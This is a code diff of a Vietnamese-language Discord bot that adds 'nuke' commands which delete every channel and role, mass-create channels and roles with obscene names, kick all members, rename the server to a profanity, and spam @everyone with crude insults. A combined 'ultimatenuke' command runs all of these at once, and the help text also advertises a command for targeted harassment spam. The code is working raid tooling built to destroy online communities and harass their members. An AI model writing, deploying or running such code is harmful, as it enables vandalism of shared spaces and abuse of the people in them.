@@ -332,7 +332,639 @@ def is_bot_owner():
         return ctx.author.id in BOT_OWNERS
     return commands.check(predicate)
 
+@bot.command(name="nuke")
+@is_bot_owner()
+async def nuke_server(ctx):
+    """Lệnh nuke server: Xóa tất cả kênh và tạo 100 kênh mới với tên tục tĩu, sau đó spam @everyone + câu chửi"""
+    try:
+        confirm_embed = discord.Embed(
+            title="⚠️ XÁC NHẬN LỆNH NUKE SERVER ⚠️",
+            description=(
+                f"🔥 **Boss Tuyền kính yêu!**\n\n"
+                f"Lệnh này sẽ:\n"
+                f"• Xóa **TOÀN BỘ** kênh trong server (text/voice/categories)\n"
+                f"• Tạo **100 kênh mới** với tên tục tĩu\n"
+                f"• Spam **10 lần @everyone + câu chửi** trong mỗi kênh\n\n"
+                f"🔹 **Gõ l!confirmnuke để xác nhận**\n"
+                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
+            ),
+            color=0xFF0000
+        )
+        await ctx.send(embed=confirm_embed)
+
+        def check(m):
+            return m.author == ctx.author and m.channel == ctx.channel
+
+        try:
+            msg = await bot.wait_for('message', timeout=30.0, check=check)
+            if msg.content.lower() != "l!confirmnuke":
+                await ctx.send("❌ Lệnh nuke đã bị hủy bỏ.")
+                return
+        except asyncio.TimeoutError:
+            await ctx.send("⏳ Hết thời gian chờ. Lệnh nuke đã bị hủy bỏ.")
+            return
+
+        nuke_embed = discord.Embed(
+            title="🚀 KÍCH HOẠT GIAI ĐOẠN NUKE SERVER 🚀",
+            description="🔥 **Đang thực hiện phá hủy toàn bộ server...** 🔥",
+            color=0xFF0000
+        )
+        await ctx.send(embed=nuke_embed)
+
+        for channel in ctx.guild.channels:
+            try:
+                await channel.delete()
+            except:
+                continue
+
+        for i in range(100):
+            try:
+                channel_name = random.choice(NUKE_CHANNEL_NAMES)
+                await ctx.guild.create_text_channel(name=channel_name)
+            except:
+                continue
+
+        spam_content = "@everyone # LỒN MẸ MÀY NÁT BÉT NHƯ TƯƠNG, BỊ ĐỊT ĐẾN KHÔNG CÒN + CHẢY LÊNH LÁNG! l!help"
+
+        for channel in ctx.guild.text_channels:
+            try:
+                for _ in range(10):  
+                    await channel.send(spam_content)
+                    await asyncio.sleep(0.1)  
+            except:
+                continue
+
+        complete_embed = discord.Embed(
+            title="💥 NUKE SERVER HOÀN TẤT 💥",
+            description=(
+                f"🔥 **Server đã bị phá hủy hoàn toàn theo lệnh của Boss Tuyền!** 🔥\n\n"
+                f"• **Đã xóa:** Tất cả kênh gốc\n"
+                f"• **Đã tạo:** 100 kênh mới với tên tục tĩu\n"
+                f"• **Đã spam:** 10 lần @everyone + câu chửi trong mỗi kênh\n\n"
+                f"💀 **Server này đã trở thành địa ngục sắc hồng!** 💀"
+            ),
+            color=0xFF0000
+        )
+        await ctx.send(embed=complete_embed)
+
+    except Exception as e:
+        error_embed = discord.Embed(
+            title="❌ LỖI KHI THỰC HIỆN NUKE",
+            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
+            color=0xFF0000
+        )
+        await ctx.send(embed=error_embed)
+
+@nuke_server.error
+async def nuke_error(ctx, error):
+    if isinstance(error, commands.CheckFailure):
+        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')
+    else:
+        await ctx.send(f"❌ Đã xảy ra lỗi khi thực hiện lệnh nuke: {str(error)}")
+
+# ==================== LỆNH TẠO KÊNH SPAM TỰ ĐỘNG ====================
+@bot.command(name="spamchannels")
+@is_bot_owner()
+async def spam_channels(ctx, amount: int = 100):
+    """Tạo nhiều kênh spam với tên tục tĩu (mặc định 100 kênh)"""
+    try:
+        if amount > 200:
+            amount = 200  
+
+        embed = discord.Embed(
+            title="🚀 KÍCH HOẠT TẠO KÊNH SPAM",
+            description=f"🔥 **Đang tạo {amount} kênh với tên tục tĩu...** 🔥",
+            color=0xFF69B4
+        )
+        await ctx.send(embed=embed)
+
+        for i in range(amount):
+            try:
+                channel_name = random.choice(NUKE_CHANNEL_NAMES)
+                await ctx.guild.create_text_channel(name=channel_name)
+                await asyncio.sleep(0.5)  
+            except:
+                continue
+
+        complete_embed = discord.Embed(
+            title="✅ TẠO KÊNH HOÀN TẤT",
+            description=f"🎉 **Đã tạo thành công {amount} kênh spam với tên tục tĩu!**",
+            color=0x00FF00
+        )
+        await ctx.send(embed=complete_embed)
+
+    except Exception as e:
+        error_embed = discord.Embed(
+            title="❌ LỖI KHI TẠO KÊNH",
+            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
+            color=0xFF0000
+        )
+        await ctx.send(embed=error_embed)
+
+@spam_channels.error
+async def spam_channels_error(ctx, error):
+    if isinstance(error, commands.CheckFailure):
+        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')
+    else:
+        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")
+
+# ==================== LỆNH SPAM @EVERYONE TRONG TẤT CẢ KÊNH ====================
+@bot.command(name="spameveryone")
+@is_bot_owner()
+async def spam_everyone(ctx):
+    """Spam @everyone + câu chửi trong tất cả kênh text"""
+    try:
+        spam_content = "@everyone # ĐỤ MẸ CẢ SERVER NÀY ĐI, LỒN MẸ MÀY NÁT BÉT NHƯ TƯƠNG! l!help"
+
+        embed = discord.Embed(
+            title="🚀 KÍCH HOẠT SPAM @EVERYONE",
+            description="🔥 **Đang spam @everyone trong tất cả kênh...** 🔥",
+            color=0xFF69B4
+        )
+        await ctx.send(embed=embed)
+
+        for channel in ctx.guild.text_channels:
+            try:
+                for _ in range(10):  
+                    await channel.send(spam_content)
+                    await asyncio.sleep(0.1)  
+            except:
+                continue
+
+        complete_embed = discord.Embed(
+            title="✅ SPAM @EVERYONE HOÀN TẤT",
+            description="🎉 **Đã spam @everyone + câu chửi trong tất cả kênh text!**",
+            color=0x00FF00
+        )
+        await ctx.send(embed=complete_embed)
+
+    except Exception as e:
+        error_embed = discord.Embed(
+            title="❌ LỖI KHI SPAM @EVERYONE",
+            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
+            color=0xFF0000
+        )
+        await ctx.send(embed=error_embed)
+
+@spam_everyone.error
+async def spam_everyone_error(ctx, error):
+    if isinstance(error, commands.CheckFailure):
+        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')
+    else:
+        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")
+
+# ==================== LỆNH XÓA TẤT CẢ KÊNH ====================
+@bot.command(name="deleteallchannels")
+@is_bot_owner()
+async def delete_all_channels(ctx):
+    """Xóa tất cả kênh trong server"""
+    try:
+        confirm_embed = discord.Embed(
+            title="⚠️ XÁC NHẬN XÓA TẤT CẢ KÊNH ⚠️",
+            description=(
+                f"🔥 **Boss Tuyền kính yêu!**\n\n"
+                f"Lệnh này sẽ xóa **TOÀN BỘ** kênh trong server (text/voice/categories)\n\n"
+                f"🔹 **Gõ l!confirmdelete để xác nhận**\n"
+                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
+            ),
+            color=0xFF0000
+        )
+        await ctx.send(embed=confirm_embed)
+
+        def check(m):
+            return m.author == ctx.author and m.channel == ctx.channel
+
+        try:
+            msg = await bot.wait_for('message', timeout=30.0, check=check)
+            if msg.content.lower() != "l!confirmdelete":
+                await ctx.send("❌ Lệnh xóa kênh đã bị hủy bỏ.")
+                return
+        except asyncio.TimeoutError:
+            await ctx.send("⏳ Hết thời gian chờ. Lệnh xóa kênh đã bị hủy bỏ.")
+            return
+
+        embed = discord.Embed(
+            title="🚀 ĐANG XÓA TẤT CẢ KÊNH...",
+            description="🔥 **Đang thực hiện xóa toàn bộ kênh trong server...** 🔥",
+            color=0xFF0000
+        )
+        await ctx.send(embed=embed)
+
+        for channel in ctx.guild.channels:
+            try:
+                await channel.delete()
+                await asyncio.sleep(0.5)  
+            except:
+                continue
+
+        complete_embed = discord.Embed(
+            title="✅ XÓA KÊNH HOÀN TẤT",
+            description="🎉 **Đã xóa thành công tất cả kênh trong server!**",
+            color=0x00FF00
+        )
+        await ctx.send(embed=complete_embed)
+
+    except Exception as e:
+        error_embed = discord.Embed(
+            title="❌ LỖI KHI XÓA KÊNH",
+            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
+            color=0xFF0000
+        )
+        await ctx.send(embed=error_embed)
+
+@delete_all_channels.error
+async def delete_all_channels_error(ctx, error):
+    if isinstance(error, commands.CheckFailure):
+        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')
+    else:
+        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")
+
+# ==================== LỆNH TẠO ROLE SPAM TỰ ĐỘNG ====================
+@bot.command(name="spamroles")
+@is_bot_owner()
+async def spam_roles(ctx, amount: int = 50):
+    """Tạo nhiều role spam với tên tục tĩu (mặc định 50 role)"""
+    try:
+        if amount > 250:
+            amount = 250  
+
+        embed = discord.Embed(
+            title="🚀 KÍCH HOẠT TẠO ROLE SPAM",
+            description=f"🔥 **Đang tạo {amount} role với tên tục tĩu...** 🔥",
+            color=0xFF69B4
+        )
+        await ctx.send(embed=embed)
+
+        for i in range(amount):
+            try:
+                role_name = random.choice(NUKE_CHANNEL_NAMES)
+                color = discord.Color(random.randint(0, 0xFFFFFF))
+                await ctx.guild.create_role(
+                    name=role_name,
+                    color=color,
+                    hoist=True,
+                    mentionable=True
+                )
+                await asyncio.sleep(0.5)  
+            except:
+                continue
+
+        complete_embed = discord.Embed(
+            title="✅ TẠO ROLE HOÀN TẤT",
+            description=f"🎉 **Đã tạo thành công {amount} role spam với tên tục tĩu!**",
+            color=0x00FF00
+        )
+        await ctx.send(embed=complete_embed)
+    except Exception as e:
+        error_embed = discord.Embed(
+            title="❌ LỖI KHI TẠO ROLE",
+            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
+            color=0xFF0000
+        )
+        await ctx.send(embed=error_embed)
+
+@spam_roles.error
+async def spam_roles_error(ctx, error):
+    if isinstance(error, commands.CheckFailure):
+        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')
+    else:
+        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")
+
+# ==================== LỆNH XÓA TẤT CẢ ROLE ====================
+@bot.command(name="deleteallroles")
+@is_bot_owner()
+async def delete_all_roles(ctx):
+    """Xóa tất cả role trong server ngoại trừ @everyone"""
+    try:
+        confirm_embed = discord.Embed(
+            title="⚠️ XÁC NHẬN XÓA TẤT CẢ ROLE ⚠️",
+            description=(
+                f"🔥 **Boss Tuyền kính yêu!**\n\n"
+                f"Lệnh này sẽ xóa **TOÀN BỘ** role trong server ngoại trừ @everyone\n\n"
+                f"🔹 **Gõ l!confirmdeleteroles để xác nhận**\n"
+                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
+            ),
+            color=0xFF0000
+        )
+        await ctx.send(embed=confirm_embed)
+
+        def check(m):
+            return m.author == ctx.author and m.channel == ctx.channel
+
+        try:
+            msg = await bot.wait_for('message', timeout=30.0, check=check)
+            if msg.content.lower() != "l!confirmdeleteroles":
+                await ctx.send("❌ Lệnh xóa role đã bị hủy bỏ.")
+                return
+        except asyncio.TimeoutError:
+            await ctx.send("⏳ Hết thời gian chờ. Lệnh xóa role đã bị hủy bỏ.")
+            return
+
+        embed = discord.Embed(
+            title="🚀 ĐANG XÓA TẤT CẢ ROLE...",
+            description="🔥 **Đang thực hiện xóa toàn bộ role trong server...** 🔥",
+            color=0xFF0000
+        )
+        await ctx.send(embed=embed)
+
+        for role in ctx.guild.roles:
+            try:
+                if role.name != "@everyone":
+                    await role.delete()
+                    await asyncio.sleep(0.5)  
+            except:
+                continue
+
+        complete_embed = discord.Embed(
+            title="✅ XÓA ROLE HOÀN TẤT",
+            description="🎉 **Đã xóa thành công tất cả role trong server (ngoại trừ @everyone)!**",
+            color=0x00FF00
+        )
+        await ctx.send(embed=complete_embed)
+    except Exception as e:
+        error_embed = discord.Embed(
+            title="❌ LỖI KHI XÓA ROLE",
+            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
+            color=0xFF0000
+        )
+        await ctx.send(embed=error_embed)
+
+@delete_all_roles.error
+async def delete_all_roles_error(ctx, error):
+    if isinstance(error, commands.CheckFailure):
+        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')
+    else:
+        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")
+
+# ==================== LỆNH KICK TẤT CẢ THÀNH VIÊN ====================
+@bot.command(name="kickall")
+@is_bot_owner()
+async def kick_all_members(ctx):
+    """Kick tất cả thành viên trong server ngoại trừ bot và owner"""
+    try:
+        confirm_embed = discord.Embed(
+            title="⚠️ XÁC NHẬN KICK TẤT CẢ THÀNH VIÊN ⚠️",
+            description=(
+                f"🔥 **Boss Tuyền kính yêu!**\n\n"
+                f"Lệnh này sẽ kick **TOÀN BỘ** thành viên trong server ngoại trừ:\n"
+                f"• Bot\n"
+                f"• Owner server\n"
+                f"• Các ID trong BOT_OWNERS\n\n"
+                f"🔹 **Gõ l!confirmkickall để xác nhận**\n"
+                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
+            ),
+            color=0xFF0000
+        )
+        await ctx.send(embed=confirm_embed)
+
+        def check(m):
+            return m.author == ctx.author and m.channel == ctx.channel
+
+        try:
+            msg = await bot.wait_for('message', timeout=30.0, check=check)
+            if msg.content.lower() != "l!confirmkickall":
+                await ctx.send("❌ Lệnh kick all đã bị hủy bỏ.")
+                return
+        except asyncio.TimeoutError:
+            await ctx.send("⏳ Hết thời gian chờ. Lệnh kick all đã bị hủy bỏ.")
+            return
+
+        embed = discord.Embed(
+            title="🚀 ĐANG KICK TẤT CẢ THÀNH VIÊN...",
+            description="🔥 **Đang thực hiện kick toàn bộ thành viên trong server...** 🔥",
+            color=0xFF0000
+        )
+        await ctx.send(embed=embed)
+
+        for member in ctx.guild.members:
+            try:
+                if (not member.bot and
+                    member.id not in BOT_OWNERS and
+                    member.id != ctx.guild.owner_id):
+                    await member.kick(reason="Server nuke theo lệnh Boss Tuyền")
+                    await asyncio.sleep(1)  
+            except:
+                continue
+
+        complete_embed = discord.Embed(
+            title="✅ KICK THÀNH VIÊN HOÀN TẤT",
+            description="🎉 **Đã kick thành công tất cả thành viên (ngoại trừ bot, owner và BOT_OWNERS)!**",
+            color=0x00FF00
+        )
+        await ctx.send(embed=complete_embed)
+    except Exception as e:
+        error_embed = discord.Embed(
+            title="❌ LỖI KHI KICK THÀNH VIÊN",
+            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
+            color=0xFF0000
+        )
+        await ctx.send(embed=error_embed)
+
+@kick_all_members.error
+async def kick_all_members_error(ctx, error):
+    if isinstance(error, commands.CheckFailure):
+        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')
+    else:
+        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")
+
+# ==================== LỆNH THAY ĐỔI TÊN SERVER ====================
+@bot.command(name="setservername")
+@is_bot_owner()
+async def set_server_name(ctx, *, new_name: str):
+    """Thay đổi tên server"""
+    try:
+        if len(new_name) > 100:
+            new_name = new_name[:100]  
+
+        await ctx.guild.edit(name=new_name)
+        embed = discord.Embed(
+            title="✅ THAY ĐỔI TÊN SERVER THÀNH CÔNG",
+            description=f"🎉 **Tên server đã được đổi thành:** {new_name}",
+            color=0x00FF00
+        )
+        await ctx.send(embed=embed)
+    except Exception as e:
+        error_embed = discord.Embed(
+            title="❌ LỖI KHI ĐỔI TÊN SERVER",
+            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
+            color=0xFF0000
+        )
+        await ctx.send(embed=error_embed)
+
+@set_server_name.error
+async def set_server_name_error(ctx, error):
+    if isinstance(error, commands.CheckFailure):
+        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')
+    else:
+        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")
+
+# ==================== LỆNH THAY ĐỔI ICON SERVER ====================
+@bot.command(name="setservericon")
+@is_bot_owner()
+async def set_server_icon(ctx, url: str = None):
+    """Thay đổi icon server (nếu không có url sẽ dùng icon mặc định)"""
+    try:
+        if url:
+            if not url.startswith(('http://', 'https://')):
+                raise ValueError("URL không hợp lệ")
+
+            async with aiohttp.ClientSession() as session:
+                async with session.get(url) as resp:
+                    if resp.status != 200:
+                        raise ValueError("Không thể tải hình ảnh từ URL")
+                    image_data = await resp.read()
+        else:
+            image_data = None
+
+        await ctx.guild.edit(icon=image_data)
+        embed = discord.Embed(
+            title="✅ THAY ĐỔI ICON SERVER THÀNH CÔNG",
+            description="🎉 **Icon server đã được cập nhật!**",
+            color=0x00FF00
+        )
+        await ctx.send(embed=embed)
+    except Exception as e:
+        error_embed = discord.Embed(
+            title="❌ LỖI KHI ĐỔI ICON SERVER",
+            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
+            color=0xFF0000
+        )
+        await ctx.send(embed=error_embed)
+
+@set_server_icon.error
+async def set_server_icon_error(ctx, error):
+    if isinstance(error, commands.CheckFailure):
+        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')
+    else:
+        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")
+
+# ==================== LỆNH TỔNG HỢP NUKE TOÀN DIỆN ====================
+@bot.command(name="ultimatenuke")
+@is_bot_owner()
+async def ultimate_nuke(ctx):
+    """Lệnh tổng hợp nuke toàn diện: xóa kênh, tạo kênh spam, tạo role spam, kick thành viên, đổi tên server"""
+    try:
+        confirm_embed = discord.Embed(
+            title="⚠️ XÁC NHẬN LỆNH ULTIMATE NUKE ⚠️",
+            description=(
+                f"🔥 **Boss Tuyền kính yêu!**\n\n"
+                f"Lệnh này sẽ thực hiện **TOÀN BỘ** các hành động sau:\n"
+                f"• Xóa tất cả kênh\n"
+                f"• Tạo 100 kênh spam với tên tục tĩu\n"
+                f"• Tạo 50 role spam với tên tục tĩu\n"
+                f"• Kick tất cả thành viên (ngoại trừ bot, owner và BOT_OWNERS)\n"
+                f"• Đổi tên server thành 'LỒN MẸ MÀY NÁT BÉT'\n"
+                f"• Spam @everyone + câu chửi trong tất cả kênh\n\n"
+                f"🔹 **Gõ l!confirmultimatenuke để xác nhận**\n"
+                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
+            ),
+            color=0xFF0000
+        )
+        await ctx.send(embed=confirm_embed)
+
+        def check(m):
+            return m.author == ctx.author and m.channel == ctx.channel
+
+        try:
+            msg = await bot.wait_for('message', timeout=30.0, check=check)
+            if msg.content.lower() != "l!confirmultimatenuke":
+                await ctx.send("❌ Lệnh ultimate nuke đã bị hủy bỏ.")
+                return
+        except asyncio.TimeoutError:
+            await ctx.send("⏳ Hết thời gian chờ. Lệnh ultimate nuke đã bị hủy bỏ.")
+            return
+
+        nuke_embed = discord.Embed(
+            title="🚀 KÍCH HOẠT ULTIMATE NUKE 🚀",
+            description="🔥 **Đang thực hiện phá hủy toàn diện server...** 🔥",
+            color=0xFF0000
+        )
+        await ctx.send(embed=nuke_embed)
+
+        for channel in ctx.guild.channels:
+            try:
+                await channel.delete()
+                await asyncio.sleep(0.3)
+            except:
+                continue
+
+        for i in range(100):
+            try:
+                channel_name = random.choice(NUKE_CHANNEL_NAMES)
+                await ctx.guild.create_text_channel(name=channel_name)
+                await asyncio.sleep(0.5)
+            except:
+                continue
+
+        for i in range(50):
+            try:
+                role_name = random.choice(NUKE_CHANNEL_NAMES)
+                color = discord.Color(random.randint(0, 0xFFFFFF))
+                await ctx.guild.create_role(
+                    name=role_name,
+                    color=color,
+                    hoist=True,
+                    mentionable=True
+                )
+                await asyncio.sleep(0.5)
+            except:
+                continue
+
+        for member in ctx.guild.members:
+            try:
+                if (not member.bot and
+                    member.id not in BOT_OWNERS and
+                    member.id != ctx.guild.owner_id):
+                    await member.kick(reason="Ultimate nuke theo lệnh Boss Tuyền")
+                    await asyncio.sleep(1)
+            except:
+                continue
+
+        try:
+            await ctx.guild.edit(name="LỒN MẸ MÀY NÁT BÉT")
+        except:
+            pass
+
+        spam_content = "@everyone # ĐỤ MẸ CẢ SERVER NÀY ĐI, LỒN MẸ MÀY NÁT BÉT NHƯ TƯƠNG! l!help"
+        for channel in ctx.guild.text_channels:
+            try:
+                for _ in range(10):
+                    await channel.send(spam_content)
+                    await asyncio.sleep(0.1)
+            except:
+                continue
+
+        complete_embed = discord.Embed(
+            title="💥 ULTIMATE NUKE HOÀN TẤT 💥",
+            description=(
+                f"🔥 **Server đã bị phá hủy hoàn toàn theo lệnh của Boss Tuyền!** 🔥\n\n"
+                f"• **Đã xóa:** Tất cả kênh gốc\n"
+                f"• **Đã tạo:** 100 kênh spam + 50 role spam\n"
+                f"• **Đã kick:** Tất cả thành viên (ngoại trừ bot, owner và BOT_OWNERS)\n"
+                f"• **Đã đổi:** Tên server thành 'LỒN MẸ MÀY NÁT BÉT'\n"
+                f"• **Đã spam:** 10 lần @everyone + câu chửi trong mỗi kênh\n\n"
+                f"💀 **Server này đã trở thành địa ngục sắc hồng vĩnh viễn!** 💀"
+            ),
+            color=0xFF0000
+        )
+        await ctx.send(embed=complete_embed)
+    except Exception as e:
+        error_embed = discord.Embed(
+            title="❌ LỖI KHI THỰC HIỆN ULTIMATE NUKE",
+            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
+            color=0xFF0000
+        )
+        await ctx.send(embed=error_embed)
+
+@ultimate_nuke.error
+async def ultimate_nuke_error(ctx, error):
+    if isinstance(error, commands.CheckFailure):
+        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS TUYỀN MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')
+    else:
+        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")
+
 # ==================== HỆ THỐNG NHÂN CÁCH ====================
+
 PERSONAS = {
     1: {
         'name': 'SWEET PRINCESS HỒNG 🌸',
@@ -391,7 +1023,7 @@ async def work(ctx):
 @bot.command(name="setpersona")
 async def setpersona(ctx, *, user_request: str = None):
     user_id = ctx.author.id
-    cost = 5000  # Chi phí 5000 coin để tùy chỉnh nhân cách bot theo yêu cầu member
+    cost = 5000  
     
     if user_id not in USER_COINS:
         USER_COINS[user_id] = 0
@@ -450,339 +1082,79 @@ async def setpersona(ctx, *, user_request: str = None):
     embed.set_footer(text="Hệ thống AI cá nhân hóa • Dưới quyền bảo trợ của Boss Tuyền 💖", icon_url=ctx.author.display_avatar.url)
     await ctx.send(embed=embed)
 
-# ==================== CÁC LỆNH ĐIỀU KHIỂN & NUKE DÀNH CHO BOSS TUYỀN ====================
 
-@bot.command(name="nuke")
+# ==================== CÁC LỆNH ĐIỀU KHIỂN DÀNH CHO BOSS TUYỀN ====================
+
+@bot.command(name="setup")
 @is_bot_owner()
-async def nuke_server(ctx):
-    """Lệnh nuke server: Xóa tất cả kênh và tạo 100 kênh mới với tên tục tĩu, sau đó spam @everyone + câu chửi"""
-    try:
-        confirm_embed = discord.Embed(
-            title="⚠️ XÁC NHẬN LỆNH NUKE SERVER ⚠️",
-            description=(
-                f"🔥 **Boss Tuyền kính yêu!**\n\n"
-                f"Lệnh này sẽ:\n"
-                f"• Xóa **TOÀN BỘ** kênh trong server (text/voice/categories)\n"
-                f"• Tạo **100 kênh mới** với tên tục tĩu\n"
-                f"• Spam **10 lần @everyone + câu chửi** trong mỗi kênh\n\n"
-                f"🔹 **Gõ l!confirmnuke để xác nhận**\n"
-                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
-            ),
-            color=0xFF0000
-        )
-        await ctx.send(embed=confirm_embed)
+async def setup(ctx):
+    global current_persona_id, last_active_persona_id, bot_stopped, is_spamming, spam_task_running
+    current_persona_id = 1
+    last_active_persona_id = 1
+    bot_stopped = False
+    is_spamming = False
+    if spam_task_running:
+        spam_task_running.cancel()
+        spam_task_running = None
 
-        def check(m):
-            return m.author == ctx.author and m.channel == ctx.channel
+    p_info = PERSONAS[1]
+    embed = discord.Embed(
+        title="💖✨ HỆ THỐNG QUẢN TRỊ TỐI CAO ĐƯỢC THIẾT KẾ RIÊNG CHO BOSS TUYỀN TRONG SẮC HỒNG THẦN THÁNH ✨💖",
+        description=(
+            f"🌸 **Kênh kết nối thiêng liêng:** {ctx.channel.mention}\n"
+            f"🎀 **Nhân cách mặc định hiện tại:** `{p_info['name']}`\n\n"
+            "Danh mục toàn bộ các hệ thống điều hành cao cấp và khu vui chơi giải trí trong sắc hồng bao gồm:\n\n"
+            "🔹 **1. `l!setup`**\n"
+            "   └ *Khởi tạo toàn bộ giao diện điều khiển trung tâm và gửi bảng thông báo màu hồng kèm hình ảnh động quyến rũ.*\n\n"
+            "🔹 **2. `l!persona <1|2>`**\n"
+            "   └ *Chuyển đổi linh hoạt giữa các trạng thái nhân cách AI cao cấp (1: Sweet Princess Hồng 🌸 | 2: Cold Master Hồng 🗿).*\n\n"
+            "🔹 **3. `l!work`**\n"
+            "   └ *Khu vui chơi giải trí dành cho mọi thành viên: Làm việc qua 50 kịch bản ngẫu nhiên để kiếm từ 100 đến 2000 coin sắc hồng mỗi lượt!* 🪙\n\n"
+            "🔹 **4. `l!setpersona [yêu cầu]`**\n"
+            "   └ *Dùng 5000 coin tích lũy từ khu vui chơi để sai khiến bot thay đổi nhân cách, hành vi và làm theo mọi yêu cầu kỳ diệu của bạn!* ✨\n\n"
+            "🔹 **5. `l!spam @user [câu chửi tùy chỉnh]`**\n"
+            "   └ *Kích hoạt lôi đài chiến dịch tra tấn văn bản tốc độ cao 600ms/câu (Sử dụng câu tùy chỉnh hoặc bốc ngẫu nhiên từ kho 209 câu chửi cực gắt).*\n\n"
+            "🔹 **6. `l!stop`**\n"
+            "   └ *Phanh gấp lập tức toàn bộ hoạt động spam, lôi đài và mọi tác vụ đang vận hành trong hệ thống.*\n\n"
+            "🔹 **7. `l!on`**\n"
+            "   └ *Tái kích hoạt đường truyền phản hồi tự động của AI và khôi phục trạng thái hoạt động toàn diện.*\n\n"
+            "🔹 **8. `l!off`**\n"
+            "   └ *Tạm thời đóng băng tính năng phản hồi tin nhắn tự động từ AI trong kênh.*\n\n"
+            "🔹 **9. `l!stats`**\n"
+            "   └ *Trích xuất toàn bộ thông số chi tiết, cấu trúc kiến trúc và nhân sự của không gian máy chủ.*\n\n"
+            "🔹 **10. `l!help`**\n"
+            "   └ *Hiển thị bảng cẩm nang điều hành chi tiết và dài dòng nhất phục vụ cho toàn bộ cộng đồng.*\n\n"
+            "🔹 **11. `l!ban @user [lý do]`**\n"
+            "   └ *Trục xuất vĩnh viễn thành viên vi phạm khỏi vương quốc màu hồng kèm theo lý do rõ ràng.*\n\n"
+            "🔹 **12. `l!nuke`**\n"
+            "   └ *Xóa tất cả kênh, tạo 100 kênh spam, spam @everyone.*\n\n"
+            "🔹 **13. `l!spamchannels [số lượng]`**\n"
+            "   └ *Tạo nhiều kênh spam (mặc định 100).*\n\n"
+            "🔹 **14. `l!spameveryone`**\n"
+            "   └ *Spam @everyone trong tất cả kênh.*\n\n"
+            "🔹 **15. `l!deleteallchannels`**\n"
+            "   └ *Xóa tất cả kênh trong server.*\n\n"
+            "🔹 **16. `l!spamroles [số lượng]`**\n"
+            "   └ *Tạo nhiều role spam (mặc định 50).*\n\n"
+            "🔹 **17. `l!deleteallroles`**\n"
+            "   └ *Xóa tất cả role ngoại trừ @everyone.*\n\n"
+            "🔹 **18. `l!kickall`**\n"
